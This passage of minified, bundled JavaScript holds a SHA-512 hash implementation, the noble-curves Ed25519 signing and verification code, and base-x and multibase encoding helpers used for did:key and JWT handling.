df","0x650a73548baf63de","0x766a0abb3c77b2a8","0x81c2c92e47edaee6","0x92722c851482353b","0xa2bfe8a14cf10364","0xa81a664bbc423001","0xc24b8b70d0f89791","0xc76c51a30654be30","0xd192e819d6ef5218","0xd69906245565a910","0xf40e35855771202a","0x106aa07032bbd1b8","0x19a4c116b8d2d0c8","0x1e376c085141ab53","0x2748774cdf8eeb99","0x34b0bcb5e19b48a8","0x391c0cb3c5c95a63","0x4ed8aa4ae3418acb","0x5b9cca4f7763e373","0x682e6ff3d6b2b8a3","0x748f82ee5defb2fc","0x78a5636f43172f60","0x84c87814a1f0ab72","0x8cc702081a6439ec","0x90befffa23631e28","0xa4506cebde82bde9","0xbef9a3f7b2c67915","0xc67178f2e372532b","0xca273eceea26619c","0xd186b8c721c0c207","0xeada7dd6cde0eb1e","0xf57d4f7fee6ed178","0x06f067aa72176fba","0x0a637dc5a2c898a6","0x113f9804bef90dae","0x1b710b35131c471b","0x28db77f523047d84","0x32caab7b40c72493","0x3c9ebe0a15c9bebc","0x431d67c49c100d4c","0x4cc5d4becb3e42b6","0x597f299cfc657e2a","0x5fcb6fab3ad6faec","0x6c44198c4a475817"].map(r=>BigInt(r))),G0=new Uint32Array(80),Z0=new Uint32Array(80);let b3e=class extends Gwe{constructor(){super(128,64,16,!1),this.Ah=1779033703,this.Al=-205731576,this.Bh=-1150833019,this.Bl=-2067093701,this.Ch=1013904242,this.Cl=-23791573,this.Dh=-1521486534,this.Dl=1595750129,this.Eh=1359893119,this.El=-1377402159,this.Fh=-1694144372,this.Fl=725511199,this.Gh=528734635,this.Gl=-79577749,this.Hh=1541459225,this.Hl=327033209}get(){const{Ah:e,Al:t,Bh:i,Bl:n,Ch:s,Cl:o,Dh:a,Dl:c,Eh:l,El:u,Fh:d,Fl:h,Gh:f,Gl:p,Hh:g,Hl:w}=this;return[e,t,i,n,s,o,a,c,l,u,d,h,f,p,g,w]}set(e,t,i,n,s,o,a,c,l,u,d,h,f,p,g,w){this.Ah=e|0,this.Al=t|0,this.Bh=i|0,this.Bl=n|0,this.Ch=s|0,this.Cl=o|0,this.Dh=a|0,this.Dl=c|0,this.Eh=l|0,this.El=u|0,this.Fh=d|0,this.Fl=h|0,this.Gh=f|0,this.Gl=p|0,this.Hh=g|0,this.Hl=w|0}process(e,t){for(let S=0;S<16;S++,t+=4)G0[S]=e.getUint32(t),Z0[S]=e.getUint32(t+=4);for(let S=16;S<80;S++){const T=G0[S-15]|0,k=Z0[S-15]|0,I=$r.rotrSH(T,k,1)^$r.rotrSH(T,k,8)^$r.shrSH(T,k,7),E=$r.rotrSL(T,k,1)^$r.rotrSL(T,k,8)^$r.shrSL(T,k,7),C=G0[S-2]|0,N=Z0[S-2]|0,L=$r.rotrSH(C,N,19)^$r.rotrBH(C,N,61)^$r.shrSH(C,N,6),$=$r.rotrSL(C,N,19)^$r.rotrBL(C,N,61)^$r.shrSL(C,N,6),y=$r.add4L(E,$,Z0[S-7],Z0[S-16]),A=$r.add4H(y,I,L,G0[S-7],G0[S-16]);G0[S]=A|0,Z0[S]=y|0}let{Ah:i,Al:n,Bh:s,Bl:o,Ch:a,Cl:c,Dh:l,Dl:u,Eh:d,El:h,Fh:f,Fl:p,Gh:g,Gl:w,Hh:m,Hl:x}=this;for(let S=0;S<80;S++){const T=$r.rotrSH(d,h,14)^$r.rotrSH(d,h,18)^$r.rotrBH(d,h,41),k=$r.rotrSL(d,h,14)^$r.rotrSL(d,h,18)^$r.rotrBL(d,h,41),I=d&f^~d&g,E=h&p^~h&w,C=$r.add5L(x,k,E,w3e[S],Z0[S]),N=$r.add5H(C,m,T,I,m3e[S],G0[S]),L=C|0,$=$r.rotrSH(i,n,28)^$r.rotrBH(i,n,34)^$r.rotrBH(i,n,39),y=$r.rotrSL(i,n,28)^$r.rotrBL(i,n,34)^$r.rotrBL(i,n,39),A=i&s^i&a^s&a,b=n&o^n&c^o&c;m=g|0,x=w|0,g=f|0,w=p|0,f=d|0,p=h|0,{h:d,l:h}=$r.add(l|0,u|0,N|0,L|0),l=a|0,u=c|0,a=s|0,c=o|0,s=i|0,o=n|0;const v=$r.add3L(L,y,b);i=$r.add3H(v,N,$,A),n=v|0}({h:i,l:n}=$r.add(this.Ah|0,this.Al|0,i|0,n|0)),{h:s,l:o}=$r.add(this.Bh|0,this.Bl|0,s|0,o|0),{h:a,l:c}=$r.add(this.Ch|0,this.Cl|0,a|0,c|0),{h:l,l:u}=$r.add(this.Dh|0,this.Dl|0,l|0,u|0),{h:d,l:h}=$r.add(this.Eh|0,this.El|0,d|0,h|0),{h:f,l:p}=$r.add(this.Fh|0,this.Fl|0,f|0,p|0),{h:g,l:w}=$r.add(this.Gh|0,this.Gl|0,g|0,w|0),{h:m,l:x}=$r.add(this.Hh|0,this.Hl|0,m|0,x|0),this.set(i,n,s,o,a,c,l,u,d,h,f,p,g,w,m,x)}roundClean(){G0.fill(0),Z0.fill(0)}destroy(){this.buffer.fill(0),this.set(0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0)}};const v3e=Vwe(()=>new b3e);/*! noble-curves - MIT License (c) 2022 Paul Miller (paulmillr.com) */const J$=BigInt(0),KJ=BigInt(1),y3e=BigInt(2);function Q$(r){return r instanceof Uint8Array||ArrayBuffer.isView(r)&&r.constructor.name==="Uint8Array"}function X$(r){if(!Q$(r))throw new Error("Uint8Array expected")}function pS(r,e){if(typeof e!="boolean")throw new Error(r+" boolean expected, got "+e)}const x3e=Array.from({length:256},(r,e)=>e.toString(16).padStart(2,"0"));function eR(r){X$(r);let e="";for(let t=0;t<r.length;t++)e+=x3e[r[t]];return e}function GJ(r){if(typeof r!="string")throw new Error("hex string expected, got "+typeof r);return r===""?J$:BigInt("0x"+r)}const dh={_0:48,_9:57,A:65,F:70,a:97,f:102};function VL(r){if(r>=dh._0&&r<=dh._9)return r-dh._0;if(r>=dh.A&&r<=dh.F)return r-(dh.A-10);if(r>=dh.a&&r<=dh.f)return r-(dh.a-10)}function ZJ(r){if(typeof r!="string")throw new Error("hex string expected, got "+typeof r);const e=r.length,t=e/2;if(e%2)throw new Error("hex string expected, got unpadded hex of length "+e);const i=new Uint8Array(t);for(let n=0,s=0;n<t;n++,s+=2){const o=VL(r.charCodeAt(s)),a=VL(r.charCodeAt(s+1));if(o===void 0||a===void 0){const c=r[s]+r[s+1];throw new Error('hex string expected, got non-hex character "'+c+'" at index '+s)}i[n]=o*16+a}return i}function C3e(r){return GJ(eR(r))}function n9(r){return X$(r),GJ(eR(Uint8Array.from(r).reverse()))}function YJ(r,e){return ZJ(r.toString(16).padStart(e*2,"0"))}function yk(r,e){return YJ(r,e).reverse()}function hh(r,e,t){let i;if(typeof e=="string")try{i=ZJ(e)}catch(s){throw new Error(r+" must be hex string or Uint8Array, cause: "+s)}else if(Q$(e))i=Uint8Array.from(e);else throw new Error(r+" must be hex string or Uint8Array");const n=i.length;if(typeof t=="number"&&n!==t)throw new Error(r+" of length "+t+" expected, got "+n);return i}function KL(...r){let e=0;for(let i=0;i<r.length;i++){const n=r[i];X$(n),e+=n.length}const t=new Uint8Array(e);for(let i=0,n=0;i<r.length;i++){const s=r[i];t.set(s,n),n+=s.length}return t}const gS=r=>typeof r=="bigint"&&J$<=r;function E3e(r,e,t){return gS(r)&&gS(e)&&gS(t)&&e<=r&&r<t}function gb(r,e,t,i){if(!E3e(e,t,i))throw new Error("expected valid "+r+": "+t+" <= n < "+i+", got "+e)}function _3e(r){let e;for(e=0;r>J$;r>>=KJ,e+=1);return e}const S3e=r=>(y3e<<BigInt(r-1))-KJ,A3e={bigint:r=>typeof r=="bigint",function:r=>typeof r=="function",boolean:r=>typeof r=="boolean",string:r=>typeof r=="string",stringOrUint8Array:r=>typeof r=="string"||Q$(r),isSafeInteger:r=>Number.isSafeInteger(r),array:r=>Array.isArray(r),field:(r,e)=>e.Fp.isValid(r),hash:r=>typeof r=="function"&&Number.isSafeInteger(r.outputLen)};function tR(r,e,t={}){const i=(n,s,o)=>{const a=A3e[s];if(typeof a!="function")throw new Error("invalid validator function");const c=r[n];if(!(o&&c===void 0)&&!a(c,r))throw new Error("param "+String(n)+" is invalid. Expected "+s+", got "+c)};for(const[n,s]of Object.entries(e))i(n,s,!1);for(const[n,s]of Object.entries(t))i(n,s,!0);return r}function GL(r){const e=new WeakMap;return(t,...i)=>{const n=e.get(t);if(n!==void 0)return n;const s=r(t,...i);return e.set(t,s),s}}const zs=BigInt(0),Jn=BigInt(1),a1=BigInt(2),I3e=BigInt(3),xk=BigInt(4),ZL=BigInt(5),YL=BigInt(8);function ys(r,e){const t=r%e;return t>=zs?t:e+t}function T3e(r,e,t){if(e<zs)throw new Error("invalid exponent, negatives unsupported");if(t<=zs)throw new Error("invalid modulus");if(t===Jn)return zs;let i=Jn;for(;e>zs;)e&Jn&&(i=i*r%t),r=r*r%t,e>>=Jn;return i}function Lu(r,e,t){let i=r;for(;e-- >zs;)i*=i,i%=t;return i}function JL(r,e){if(r===zs)throw new Error("invert: expected non-zero number");if(e<=zs)throw new Error("invert: expected positive modulus, got "+e);let t=ys(r,e),i=e,n=zs,s=Jn;for(;t!==zs;){const o=i/t,a=i%t,c=n-s*o;i=t,t=a,n=s,s=c}if(i!==Jn)throw new Error("invert: does not exist");return ys(n,e)}function k3e(r){const e=(r-Jn)/a1;let t,i,n;for(t=r-Jn,i=0;t%a1===zs;t/=a1,i++);for(n=a1;n<r&&T3e(n,e,r)!==r-Jn;n++)if(n>1e3)throw new Error("Cannot find square root: likely non-prime P");if(i===1){const o=(r+Jn)/xk;return function(a,c){const l=a.pow(c,o);if(!a.eql(a.sqr(l),c))throw new Error("Cannot find square root");return l}}const s=(t+Jn)/a1;return function(o,a){if(o.pow(a,e)===o.neg(o.ONE))throw new Error("Cannot find square root");let c=i,l=o.pow(o.mul(o.ONE,n),t),u=o.pow(a,s),d=o.pow(a,t);for(;!o.eql(d,o.ONE);){if(o.eql(d,o.ZERO))return o.ZERO;let h=1;for(let p=o.sqr(d);h<c&&!o.eql(p,o.ONE);h++)p=o.sqr(p);const f=o.pow(l,Jn<<BigInt(c-h-1));l=o.sqr(f),u=o.mul(u,f),d=o.mul(d,l),c=h}return u}}function N3e(r){if(r%xk===I3e){const e=(r+Jn)/xk;return function(t,i){const n=t.pow(i,e);if(!t.eql(t.sqr(n),i))throw new Error("Cannot find square root");return n}}if(r%YL===ZL){const e=(r-ZL)/YL;return function(t,i){const n=t.mul(i,a1),s=t.pow(n,e),o=t.mul(i,s),a=t.mul(t.mul(o,a1),s),c=t.mul(o,t.sub(a,t.ONE));if(!t.eql(t.sqr(c),i))throw new Error("Cannot find square root");return c}}return k3e(r)}const P3e=(r,e)=>(ys(r,e)&Jn)===Jn,$3e=["create","isValid","is0","neg","inv","sqrt","sqr","eql","add","sub","mul","pow","div","addN","subN","mulN","sqrN"];function R3e(r){const e={ORDER:"bigint",MASK:"bigint",BYTES:"isSafeInteger",BITS:"isSafeInteger"},t=$3e.reduce((i,n)=>(i[n]="function",i),e);return tR(r,t)}function O3e(r,e,t){if(t<zs)throw new Error("invalid exponent, negatives unsupported");if(t===zs)return r.ONE;if(t===Jn)return e;let i=r.ONE,n=e;for(;t>zs;)t&Jn&&(i=r.mul(i,n)),n=r.sqr(n),t>>=Jn;return i}function B3e(r,e){const t=new Array(e.length),i=e.reduce((s,o,a)=>r.is0(o)?s:(t[a]=s,r.mul(s,o)),r.ONE),n=r.inv(i);return e.reduceRight((s,o,a)=>r.is0(o)?s:(t[a]=r.mul(s,t[a]),r.mul(s,o)),n),t}function JJ(r,e){const t=e!==void 0?e:r.toString(2).length,i=Math.ceil(t/8);return{nBitLength:t,nByteLength:i}}function QJ(r,e,t=!1,i={}){if(r<=zs)throw new Error("invalid field: expected ORDER > 0, got "+r);const{nBitLength:n,nByteLength:s}=JJ(r,e);if(s>2048)throw new Error("invalid field: expected ORDER of <= 2048 bytes");let o;const a=Object.freeze({ORDER:r,isLE:t,BITS:n,BYTES:s,MASK:S3e(n),ZERO:zs,ONE:Jn,create:c=>ys(c,r),isValid:c=>{if(typeof c!="bigint")throw new Error("invalid field element: expected bigint, got "+typeof c);return zs<=c&&c<r},is0:c=>c===zs,isOdd:c=>(c&Jn)===Jn,neg:c=>ys(-c,r),eql:(c,l)=>c===l,sqr:c=>ys(c*c,r),add:(c,l)=>ys(c+l,r),sub:(c,l)=>ys(c-l,r),mul:(c,l)=>ys(c*l,r),pow:(c,l)=>O3e(a,c,l),div:(c,l)=>ys(c*JL(l,r),r),sqrN:c=>c*c,addN:(c,l)=>c+l,subN:(c,l)=>c-l,mulN:(c,l)=>c*l,inv:c=>JL(c,r),sqrt:i.sqrt||(c=>(o||(o=N3e(r)),o(a,c))),invertBatch:c=>B3e(a,c),cmov:(c,l,u)=>u?l:c,toBytes:c=>t?yk(c,s):YJ(c,s),fromBytes:c=>{if(c.length!==s)throw new Error("Field.fromBytes: expected "+s+" bytes, got "+c.length);return t?n9(c):C3e(c)}});return Object.freeze(a)}const QL=BigInt(0),V6=BigInt(1);function mS(r,e){const t=e.negate();return r?t:e}function XJ(r,e){if(!Number.isSafeInteger(r)||r<=0||r>e)throw new Error("invalid window size, expected [1.."+e+"], got W="+r)}function wS(r,e){XJ(r,e);const t=Math.ceil(e/r)+1,i=2**(r-1);return{windows:t,windowSize:i}}function M3e(r,e){if(!Array.isArray(r))throw new Error("array expected");r.forEach((t,i)=>{if(!(t instanceof e))throw new Error("invalid point at index "+i)})}function D3e(r,e){if(!Array.isArray(r))throw new Error("array of scalars expected");r.forEach((t,i)=>{if(!e.isValid(t))throw new Error("invalid scalar at index "+i)})}const bS=new WeakMap,eQ=new WeakMap;function vS(r){return eQ.get(r)||1}function L3e(r,e){return{constTimeNegate:mS,hasPrecomputes(t){return vS(t)!==1},unsafeLadder(t,i,n=r.ZERO){let s=t;for(;i>QL;)i&V6&&(n=n.add(s)),s=s.double(),i>>=V6;return n},precomputeWindow(t,i){const{windows:n,windowSize:s}=wS(i,e),o=[];let a=t,c=a;for(let l=0;l<n;l++){c=a,o.push(c);for(let u=1;u<s;u++)c=c.add(a),o.push(c);a=c.double()}return o},wNAF(t,i,n){const{windows:s,windowSize:o}=wS(t,e);let a=r.ZERO,c=r.BASE;const l=BigInt(2**t-1),u=2**t,d=BigInt(t);for(let h=0;h<s;h++){const f=h*o;let p=Number(n&l);n>>=d,p>o&&(p-=u,n+=V6);const g=f,w=f+Math.abs(p)-1,m=h%2!==0,x=p<0;p===0?c=c.add(mS(m,i[g])):a=a.add(mS(x,i[w]))}return{p:a,f:c}},wNAFUnsafe(t,i,n,s=r.ZERO){const{windows:o,windowSize:a}=wS(t,e),c=BigInt(2**t-1),l=2**t,u=BigInt(t);for(let d=0;d<o;d++){const h=d*a;if(n===QL)break;let f=Number(n&c);if(n>>=u,f>a&&(f-=l,n+=V6),f===0)continue;let p=i[h+Math.abs(f)-1];f<0&&(p=p.negate()),s=s.add(p)}return s},getPrecomputes(t,i,n){let s=bS.get(i);return s||(s=this.precomputeWindow(i,t),t!==1&&bS.set(i,n(s))),s},wNAFCached(t,i,n){const s=vS(t);return this.wNAF(s,this.getPrecomputes(s,t,n),i)},wNAFCachedUnsafe(t,i,n,s){const o=vS(t);return o===1?this.unsafeLadder(t,i,s):this.wNAFUnsafe(o,this.getPrecomputes(o,t,n),i,s)},setWindowSize(t,i){XJ(i,e),eQ.set(t,i),bS.delete(t)}}}function U3e(r,e,t,i){if(M3e(t,r),D3e(i,e),t.length!==i.length)throw new Error("arrays of points and scalars must have equal length");const n=r.ZERO,s=_3e(BigInt(t.length)),o=s>12?s-3:s>4?s-2:s?2:1,a=(1<<o)-1,c=new Array(a+1).fill(n),l=Math.floor((e.BITS-1)/o)*o;let u=n;for(let d=l;d>=0;d-=o){c.fill(n);for(let f=0;f<i.length;f++){const p=i[f],g=Number(p>>BigInt(d)&BigInt(a));c[g]=c[g].add(t[f])}let h=n;for(let f=c.length-1,p=n;f>0;f--)p=p.add(c[f]),h=h.add(p);if(u=u.add(h),d!==0)for(let f=0;f<o;f++)u=u.double()}return u}function j3e(r){return R3e(r.Fp),tR(r,{n:"bigint",h:"bigint",Gx:"field",Gy:"field"},{nBitLength:"isSafeInteger",nByteLength:"isSafeInteger"}),Object.freeze({...JJ(r.n,r.nBitLength),...r,p:r.Fp.ORDER})}const Ll=BigInt(0),oa=BigInt(1),K6=BigInt(2),F3e=BigInt(8),q3e={zip215:!0};function z3e(r){const e=j3e(r);return tR(r,{hash:"function",a:"bigint",d:"bigint",randomBytes:"function"},{adjustScalarBytes:"function",domain:"function",uvRatio:"function",mapToCurve:"function"}),Object.freeze({...e})}function W3e(r){const e=z3e(r),{Fp:t,n:i,prehash:n,hash:s,randomBytes:o,nByteLength:a,h:c}=e,l=K6<<BigInt(a*8)-oa,u=t.create,d=QJ(e.n,e.nBitLength),h=e.uvRatio||((v,_)=>{try{return{isValid:!0,value:t.sqrt(v*t.inv(_))}}catch{return{isValid:!1,value:Ll}}}),f=e.adjustScalarBytes||(v=>v),p=e.domain||((v,_,O)=>{if(pS("phflag",O),_.length||O)throw new Error("Contexts/pre-hash are not supported");return v});function g(v,_){gb("coordinate "+v,_,Ll,l)}function w(v){if(!(v instanceof S))throw new Error("ExtendedPoint expected")}const m=GL((v,_)=>{const{ex:O,ey:D,ez:R}=v,P=v.is0();_==null&&(_=P?F3e:t.inv(R));const B=u(O*_),M=u(D*_),W=u(R*_);if(P)return{x:Ll,y:oa};if(W!==oa)throw new Error("invZ was invalid");return{x:B,y:M}}),x=GL(v=>{const{a:_,d:O}=e;if(v.is0())throw new Error("bad point: ZERO");const{ex:D,ey:R,ez:P,et:B}=v,M=u(D*D),W=u(R*R),K=u(P*P),q=u(K*K),J=u(M*_),le=u(K*u(J+W)),ae=u(q+u(O*u(M*W)));if(le!==ae)throw new Error("bad point: equation left != right (1)");const U=u(D*R),G=u(P*B);if(U!==G)throw new Error("bad point: equation left != right (2)");return!0});class S{constructor(_,O,D,R){this.ex=_,this.ey=O,this.ez=D,this.et=R,g("x",_),g("y",O),g("z",D),g("t",R),Object.freeze(this)}get x(){return this.toAffine().x}get y(){return this.toAffine().y}static fromAffine(_){if(_ instanceof S)throw new Error("extended point not allowed");const{x:O,y:D}=_||{};return g("x",O),g("y",D),new S(O,D,oa,u(O*D))}static normalizeZ(_){const O=t.invertBatch(_.map(D=>D.ez));return _.map((D,R)=>D.toAffine(O[R])).map(S.fromAffine)}static msm(_,O){return U3e(S,d,_,O)}_setWindowSize(_){I.setWindowSize(this,_)}assertValidity(){x(this)}equals(_){w(_);const{ex:O,ey:D,ez:R}=this,{ex:P,ey:B,ez:M}=_,W=u(O*M),K=u(P*R),q=u(D*M),J=u(B*R);return W===K&&q===J}is0(){return this.equals(S.ZERO)}negate(){return new S(u(-this.ex),this.ey,this.ez,u(-this.et))}double(){const{a:_}=e,{ex:O,ey:D,ez:R}=this,P=u(O*O),B=u(D*D),M=u(K6*u(R*R)),W=u(_*P),K=O+D,q=u(u(K*K)-P-B),J=W+B,le=J-M,ae=W-B,U=u(q*le),G=u(J*ae),Z=u(q*ae),j=u(le*J);return new S(U,G,j,Z)}add(_){w(_);const{a:O,d:D}=e,{ex:R,ey:P,ez:B,et:M}=this,{ex:W,ey:K,ez:q,et:J}=_;if(O===BigInt(-1)){const Ae=u((P-R)*(K+W)),De=u((P+R)*(K-W)),Le=u(De-Ae);if(Le===Ll)return this.double();const it=u(B*K6*J),nt=u(M*K6*q),ct=nt+it,St=De+Ae,zt=nt-it,Q=u(ct*Le),z=u(St*zt),H=u(ct*zt),ie=u(Le*St);return new S(Q,z,ie,H)}const le=u(R*W),ae=u(P*K),U=u(M*D*J),G=u(B*q),Z=u((R+P)*(W+K)-le-ae),j=G-U,Y=G+U,se=u(ae-O*le),ne=u(Z*j),Te=u(Y*se),Re=u(Z*se),$e=u(j*Y);return new S(ne,Te,$e,Re)}subtract(_){return this.add(_.negate())}wNAF(_){return I.wNAFCached(this,_,S.normalizeZ)}multiply(_){const O=_;gb("scalar",O,oa,i);const{p:D,f:R}=this.wNAF(O);return S.normalizeZ([D,R])[0]}multiplyUnsafe(_,O=S.ZERO){const D=_;return gb("scalar",D,Ll,i),D===Ll?k:this.is0()||D===oa?this:I.wNAFCachedUnsafe(this,D,S.normalizeZ,O)}isSmallOrder(){return this.multiplyUnsafe(c).is0()}isTorsionFree(){return I.unsafeLadder(this,i).is0()}toAffine(_){return m(this,_)}clearCofactor(){const{h:_}=e;return _===oa?this:this.multiplyUnsafe(_)}static fromHex(_,O=!1){const{d:D,a:R}=e,P=t.BYTES;_=hh("pointHex",_,P),pS("zip215",O);const B=_.slice(),M=_[P-1];B[P-1]=M&-129;const W=n9(B),K=O?l:t.ORDER;gb("pointHex.y",W,Ll,K);const q=u(W*W),J=u(q-oa),le=u(D*q-R);let{isValid:ae,value:U}=h(J,le);if(!ae)throw new Error("Point.fromHex: invalid y coordinate");const G=(U&oa)===oa,Z=(M&128)!==0;if(!O&&U===Ll&&Z)throw new Error("Point.fromHex: x=0 and x_0=1");return Z!==G&&(U=u(-U)),S.fromAffine({x:U,y:W})}static fromPrivateKey(_){return N(_).point}toRawBytes(){const{x:_,y:O}=this.toAffine(),D=yk(O,t.BYTES);return D[D.length-1]|=_&oa?128:0,D}toHex(){return eR(this.toRawBytes())}}S.BASE=new S(e.Gx,e.Gy,oa,u(e.Gx*e.Gy)),S.ZERO=new S(Ll,oa,oa,Ll);const{BASE:T,ZERO:k}=S,I=L3e(S,a*8);function E(v){return ys(v,i)}function C(v){return E(n9(v))}function N(v){const _=t.BYTES;v=hh("private key",v,_);const O=hh("hashed private key",s(v),2*_),D=f(O.slice(0,_)),R=O.slice(_,2*_),P=C(D),B=T.multiply(P),M=B.toRawBytes();return{head:D,prefix:R,scalar:P,point:B,pointBytes:M}}function L(v){return N(v).pointBytes}function $(v=new Uint8Array,..._){const O=KL(..._);return C(s(p(O,hh("context",v),!!n)))}function y(v,_,O={}){v=hh("message",v),n&&(v=n(v));const{prefix:D,scalar:R,pointBytes:P}=N(_),B=$(O.context,D,v),M=T.multiply(B).toRawBytes(),W=$(O.context,M,P,v),K=E(B+W*R);gb("signature.s",K,Ll,i);const q=KL(M,yk(K,t.BYTES));return hh("result",q,t.BYTES*2)}const A=q3e;function b(v,_,O,D=A){const{context:R,zip215:P}=D,B=t.BYTES;v=hh("signature",v,2*B),_=hh("message",_),O=hh("publicKey",O,B),P!==void 0&&pS("zip215",P),n&&(_=n(_));const M=n9(v.slice(B,2*B));let W,K,q;try{W=S.fromHex(O,P),K=S.fromHex(v.slice(0,B),P),q=T.multiplyUnsafe(M)}catch{return!1}if(!P&&W.isSmallOrder())return!1;const J=$(R,K.toRawBytes(),W.toRawBytes(),_);return K.add(W.multiplyUnsafe(J)).subtract(q).clearCofactor().equals(S.ZERO)}return T._setWindowSize(8),{CURVE:e,getPublicKey:L,sign:y,verify:b,ExtendedPoint:S,utils:{getExtendedPublicKey:N,randomPrivateKey:()=>o(t.BYTES),precompute(v=8,_=S.BASE){return _._setWindowSize(v),_.multiply(BigInt(3)),_}}}}BigInt(0),BigInt(1);const rR=BigInt("57896044618658097711785492504343953926634992332820282019728792003956564819949"),XL=BigInt("19681161376707505956807079304988542015446066515923890162744021073123829784752");BigInt(0);const H3e=BigInt(1),eU=BigInt(2);BigInt(3);const V3e=BigInt(5),K3e=BigInt(8);function G3e(r){const e=BigInt(10),t=BigInt(20),i=BigInt(40),n=BigInt(80),s=rR,o=r*r%s*r%s,a=Lu(o,eU,s)*o%s,c=Lu(a,H3e,s)*r%s,l=Lu(c,V3e,s)*c%s,u=Lu(l,e,s)*l%s,d=Lu(u,t,s)*u%s,h=Lu(d,i,s)*d%s,f=Lu(h,n,s)*h%s,p=Lu(f,n,s)*h%s,g=Lu(p,e,s)*l%s;return{pow_p_5_8:Lu(g,eU,s)*r%s,b2:o}}function Z3e(r){return r[0]&=248,r[31]&=127,r[31]|=64,r}function Y3e(r,e){const t=rR,i=ys(e*e*e,t),n=ys(i*i*e,t),s=G3e(r*n).pow_p_5_8;let o=ys(r*i*s,t);const a=ys(e*o*o,t),c=o,l=ys(o*XL,t),u=a===r,d=a===ys(-r,t),h=a===ys(-r*XL,t);return u&&(o=c),(d||h)&&(o=l),P3e(o,t)&&(o=ys(-o,t)),{isValid:u||d,value:o}}const J3e=QJ(rR,void 0,!0),Q3e={a:BigInt(-1),d:BigInt("37095705934669439343138083508754565189542113879843219016388785533085940283555"),Fp:J3e,n:BigInt("7237005577332262213973186563042994240857116359379907606001950938285454250989"),h:K3e,Gx:BigInt("15112221349535400772501151409588531511454012693041857206046113283949847762202"),Gy:BigInt("46316835694926478169428394003475163141307993866256225615783033603165251855960"),hash:v3e,randomBytes:HJ,adjustScalarBytes:Z3e,uvRatio:Y3e},tQ=W3e(Q3e),X3e="EdDSA",ebe="JWT",n7=".",tC="base64url",rQ="utf8",iQ="utf8",tbe=":",rbe="did",ibe="key",tU="base58btc",nbe="z",sbe="K36",obe=32;function iR(r){return globalThis.Buffer!=null?new Uint8Array(r.buffer,r.byteOffset,r.byteLength):r}function nQ(r=0){return globalThis.Buffer!=null&&globalThis.Buffer.allocUnsafe!=null?iR(globalThis.Buffer.allocUnsafe(r)):new Uint8Array(r)}function sQ(r,e){e||(e=r.reduce((n,s)=>n+s.length,0));const t=nQ(e);let i=0;for(const n of r)t.set(n,i),i+=n.length;return iR(t)}function abe(r,e){if(r.length>=255)throw new TypeError("Alphabet too long");for(var t=new Uint8Array(256),i=0;i<t.length;i++)t[i]=255;for(var n=0;n<r.length;n++){var s=r.charAt(n),o=s.charCodeAt(0);if(t[o]!==255)throw new TypeError(s+" is ambiguous");t[o]=n}var a=r.length,c=r.charAt(0),l=Math.log(a)/Math.log(256),u=Math.log(256)/Math.log(a);function d(p){if(p instanceof Uint8Array||(ArrayBuffer.isView(p)?p=new Uint8Array(p.buffer,p.byteOffset,p.byteLength):Array.isArray(p)&&(p=Uint8Array.from(p))),!(p instanceof Uint8Array))throw new TypeError("Expected Uint8Array");if(p.length===0)return"";for(var g=0,w=0,m=0,x=p.length;m!==x&&p[m]===0;)m++,g++;for(var S=(x-m)*u+1>>>0,T=new Uint8Array(S);m!==x;){for(var k=p[m],I=0,E=S-1;(k!==0||I<w)&&E!==-1;E--,I++)k+=256*T[E]>>>0,T[E]=k%a>>>0,k=k/a>>>0;if(k!==0)throw new Error("Non-zero carry");w=I,m++}for(var C=S-w;C!==S&&T[C]===0;)C++;for(var N=c.repeat(g);C<S;++C)N+=r.charAt(T[C]);return N}function h(p){if(typeof p!="string")throw new TypeError("Expected String");if(p.length===0)return new Uint8Array;var g=0;if(p[g]!==" "){for(var w=0,m=0;p[g]===c;)w++,g++;for(var x=(p.length-g)*l+1>>>0,S=new Uint8Array(x);p[g];){var T=t[p.charCodeAt(g)];if(T===255)return;for(var k=0,I=x-1;(T!==0||k<m)&&I!==-1;I--,k++)T+=a*S[I]>>>0,S[I]=T%256>>>0,T=T/256>>>0;if(T!==0)throw new Error("Non-zero carry");m=k,g++}if(p[g]!==" "){for(var E=x-m;E!==x&&S[E]===0;)E++;for(var C=new Uint8Array(w+(x-E)),N=w;E!==x;)C[N++]=S[E++];return C}}}function f(p){var g=h(p);if(g)return g;throw new Error(`Non-${e} character`)}return{encode:d,decodeUnsafe:h,decode:f}}var cbe=abe,lbe=cbe;const oQ=r=>{if(r instanceof Uint8Array&&r.constructor.name==="Uint8Array")return r;if(r instanceof ArrayBuffer)return new Uint8Array(r);if(ArrayBuffer.isView(r))return new Uint8Array(r.buffer,r.byteOffset,r.byteLength);throw new Error("Unknown type, must be binary type")},ube=r=>new TextEncoder().encode(r),dbe=r=>new TextDecoder().decode(r);let hbe=class{constructor(e,t,i){this.name=e,this.prefix=t,this.baseEncode=i}encode(e){if(e instanceof Uint8Array)return`${this.prefix}${this.baseEncode(e)}`;throw Error("Unknown type, must be binary type")}},fbe=class{constructor(e,t,i){if(this.name=e,this.prefix=t,t.codePointAt(0)===void 0)throw new Error("Invalid prefix character");this.prefixCodePoint=t.codePointAt(0),this.baseDecode=i}decode(e){if(typeof e=="string"){if(e.codePointAt(0)!==this.prefixCodePoint)throw Error(`Unable to decode multibase string ${JSON.stringify(e)}, ${this.name} decoder only supports inputs prefixed with ${this.prefix}`);return this.baseDecode(e.slice(this.prefix.length))}else throw Error("Can only multibase decode strings")}or(e){return aQ(this,e)}},pbe=class{constructor(e){this.decoders=e}or(e){return aQ(this,e)}decode(e){const t=e[0],i=this.decoders[t];if(i)return i.decode(e);throw RangeError(`Unable to decode multibase string ${JSON.stringify(e)}, only inputs prefixed with ${Object.keys(this.decoders)} are supported`)}};const aQ=(r,e)=>new pbe({...r.decoders||{[r.prefix]:r},...e.decoders||{[e.prefix]:e}});let gbe=class{constructor(e,t,i,n){this.name=e,this.prefix=t,this.baseEncode=i,this.baseDecode=n,this.encoder=new hbe(e,t,i),this.decoder=new fbe(e,t,n)}encode(e){return this.encoder.encode(e)}decode(e){return this.decoder.decode(e)}};const rC=({name:r,prefix:e,encode:t,decode:i})=>new gbe(r,e,t,i),l4=({prefix:r,name:e,alphabet:t})=>{const{encode:i,decode:n}=lbe(t,e);return rC({prefix:r,name:e,encode:i,decode:s=>oQ(n(s))})},mbe=(r,e,t,i)=>{const n={};for(let u=0;u<e.length;++u)n[e[u]]=u;let s=r.length;for(;r[s-1]==="=";)--s;const o=new Uint8Array(s*t/8|0);let a=0,c=0,l=0;for(let u=0;u<s;++u){const d=n[r[u]];if(d===void 0)throw new SyntaxError(`Non-${i} 